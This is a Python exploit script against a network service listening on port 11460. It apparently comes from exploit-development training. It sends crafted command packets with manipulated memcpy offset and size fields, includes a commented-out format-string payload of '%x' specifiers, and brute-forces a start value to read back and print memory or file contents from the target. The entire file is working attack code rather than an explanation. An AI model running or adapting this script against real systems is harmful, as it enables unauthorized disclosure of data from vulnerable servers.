#!/usr/bin/env python3

import socket
import sys
from struct import pack


def main():
    server = "192.168.185.10"
    if len(sys.argv) >= 2:
        server = sys.argv[1]

    port = 11460

    # psAgentCommand
    buf = pack(">i", 0x400)
    buf += bytearray([0x41] * 0xC)
    buf += pack("<i", 0x604)  # opcode
    buf += pack("<i", 0x0)  # 1st memcpy: offset
    buf += pack("<i", 0x100)  # 1st memcpy: size field
    buf += pack("<i", 0x100)  # 2nd memcpy: offset
    buf += pack("<i", 0x100)  # 2nd memcpy: size field
    buf += pack("<i", 0x200)  # 3rd memcpy: offset
    buf += pack("<i", 0x100)  # 3rd memcpy: size field
    buf += bytearray([0x41] * 0x8)

    # psCommandBuffer
    buf += b"%x  " * 0x40
    buf += b"B" * 0x100
    buf += b"C" * 0x100

    # Padding
    buf += bytearray([0x41] * (0x404 - len(buf)))

    # s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # s.connect((server, port))
    # s.send(buf)
    # s.close()

    startValue = 0x00
    while True:

        # psAgentCommand
        buf = pack(">i", 0x400)
        buf += bytearray([0x41] * 0xC)
        buf += pack("<i", 0x520)  # opcode
        buf += pack("<i", 0x0)  # 1st memcpy: offset
        buf += pack("<i", 0x100)  # 1st memcpy: size field
        buf += pack("<i", 0x100)  # 2nd memcpy: offset
        buf += pack("<i", 0x100)  # 2nd memcpy: size field
        buf += pack("<i", 0x200)  # 3rd memcpy: offset
        buf += pack("<i", 0x100)  # 3rd memcpy: size field
        buf += bytearray([0x41] * 0x8)

        # psCommandBuffer
        buf += b"FileType: %d ,Start: %d, Length: %d" % (1, startValue, 0x1000)
        buf += b"B" * 0x100
        buf += b"C" * 0x100

        # Padding
        buf += bytearray([0x41] * (0x404 - len(buf)))

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server, port))

        s.send(buf)

        s.settimeout(2)
        response = s.recv(4)

        response_size = int(response.hex(), 16)

        print("Start Value: " + str(hex(startValue)) + " Size: " + str(hex(response_size)))

        if response_size >= 0x100000:
            s.close()
            startValue += 0x1000
            continue

        s.close()

        response_size = response_size >> 8
        startValue += response_size
        break

    print("Ideal start value: " + str(hex(startValue)))

    # psAgentCommand
    buf = pack(">i", 0x400)
    buf += bytearray([0x41] * 0xC)
    buf += pack("<i", 0x520)  # opcode
    buf += pack("<i", 0x0)  # 1st memcpy: offset
    buf += pack("<i", 0x100)  # 1st memcpy: size field
    buf += pack("<i", 0x100)  # 2nd memcpy: offset
    buf += pack("<i", 0x100)  # 2nd memcpy: size field
    buf += pack("<i", 0x200)  # 3rd memcpy: offset
    buf += pack("<i", 0x100)  # 3rd memcpy: size field
    buf += bytearray([0x41] * 0x8)

    # psCommandBuffer
    buf += b"FileType: %d ,Start: %d, Length: %d" % (1, startValue, 0x1000)
    buf += b"B" * 0x100
    buf += b"C" * 0x100

    # Padding
    buf += bytearray([0x41] * (0x404 - len(buf)))

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((server, port))
    s.send(buf)
    response = s.recv(4)
    response_size = int(response.hex(), 16)

    print("Downloading " + str(response_size) + " bytes...")
    response = b""
    try:
        while True:
            response += s.recv(4096)
    except Exception as e:
        print(e)
        s.close()

    print(response)

    print("[+] Packet sent")
    sys.exit(0)


if __name__ == "__main__":
    main()